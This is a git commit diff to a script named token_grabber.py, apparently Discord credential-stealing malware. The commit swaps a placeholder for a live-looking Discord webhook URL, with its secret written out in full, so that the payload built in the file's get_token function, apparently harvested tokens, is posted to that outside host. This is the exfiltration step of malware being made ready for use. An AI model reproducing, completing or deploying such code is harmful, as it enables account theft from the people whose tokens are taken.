107255d2af1d51f2c6fad9254bd3d1af4acec0f9
Zombro01 <129699676+Zombro01@users.noreply.github.com>
2024-02-12 19:14:59 -0800

    Update token_grabber.py

--- token_grabber.py
+++ token_grabber.py
@@ -121,7 +121,7 @@ def get_token():
                                 'Content-Type': 'application/json',
                                 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                             }
-                            req = Request('WEBHOOK-URL', data=payload.encode(), headers=headers2)
+                            req = Request('https://discord.com/api/webhooks/1206799419404582982/myMWhDEu7pM2MvRhdiaTE1ler2pntsdN5h_nMiO-TSWkj3rQUS7d4ADYdJKxkbSGvQ-W', data=payload.encode(), headers=headers2)
                             urlopen(req)
                         except: continue
                 else: continue
